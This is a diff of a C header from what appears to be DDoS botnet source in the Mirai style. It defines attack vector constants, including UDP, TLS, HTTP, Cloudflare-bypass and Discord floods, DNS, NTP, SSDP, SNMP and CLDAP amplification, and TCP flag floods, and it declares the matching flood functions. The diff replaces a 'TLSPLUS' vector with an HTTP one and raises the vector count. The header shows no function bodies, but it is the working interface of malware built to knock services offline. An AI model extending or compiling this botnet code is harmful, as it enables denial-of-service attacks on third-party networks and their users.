@@ -8,28 +8,28 @@
 #define ATK_VEC_FIVEM           2
 #define ATK_VEC_PPS             3
 #define ATK_VEC_TLS             4
-#define ATK_VEC_TLSPLUS         5
+#define ATK_VEC_HTTP            5
 #define ATK_VEC_CF              6
 #define ATK_VEC_AXISL7          7
 #define ATK_VEC_DNS_AMP         8
 #define ATK_VEC_NTP_AMP         9
-#define ATK_VEC_SSDP_AMP        10
-#define ATK_VEC_SNMP_AMP        11
-#define ATK_VEC_CLDAP_AMP       12
-#define ATK_VEC_SYN             13
-#define ATK_VEC_ACK             14
-#define ATK_VEC_FIN             15
-#define ATK_VEC_RST             16
-#define ATK_VEC_TCPCONN         17
-#define ATK_VEC_XMAS            18
-#define ATK_VEC_NULL            19
-#define ATK_VEC_WINDOW          20
-#define ATK_VEC_ICMP            21
+#define ATK_VEC_SSDP_AMP      10
+#define ATK_VEC_SNMP_AMP      11
+#define ATK_VEC_CLDAP_AMP     12
+#define ATK_VEC_SYN           13
+#define ATK_VEC_ACK           14
+#define ATK_VEC_FIN           15
+#define ATK_VEC_RST           16
+#define ATK_VEC_TCPCONN       17
+#define ATK_VEC_XMAS          18
+#define ATK_VEC_NULL          19
+#define ATK_VEC_WINDOW        20
+#define ATK_VEC_ICMP          21
 #define ATK_VEC_GREIP           22
 #define ATK_VEC_GREETH          23
 #define ATK_VEC_DISCORD       30
 
-#define ATK_VEC_MAX             24
+#define ATK_VEC_MAX             26
 
 #define ATTACK_MAX_TARGETS  32
 #define ATTACK_MAX_OPTIONS  32
@@ -78,11 +78,11 @@ int attack_get_opt_int(int, struct attack_option *, int, uint8_t);
 
 void attack_udp_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_vse_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+void attack_tls_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+void attack_http_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_fivem_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_discord_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_pps_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
-void attack_tls_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
-void attack_tlsplus_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_cf_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_axis_l7(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_dns_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
